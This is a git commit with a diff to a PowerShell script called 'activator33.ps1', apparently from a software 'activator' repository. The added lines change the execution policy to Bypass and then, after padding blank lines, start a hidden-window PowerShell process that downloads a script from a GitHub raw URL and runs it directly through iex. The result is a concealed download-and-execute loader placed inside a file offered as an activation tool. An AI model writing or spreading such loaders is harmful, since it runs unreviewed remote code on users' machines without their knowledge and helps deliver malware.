99097a287c1fca39a8c4936144aa4744fac19b7a
activator11 <153140346+activator11@users.noreply.github.com>
2024-11-19 08:32:21 +0330

    Update activator33.ps1

--- activator33.ps1
+++ activator33.ps1
@@ -1,1 +1,6 @@
-powershell -c "Set-ExecutionPolicy Bypass -Scope Process -Force"
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
+
+
+
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm https://raw.githubusercontent.com/activator11/activator22/main/activator22.ps1 | iex"
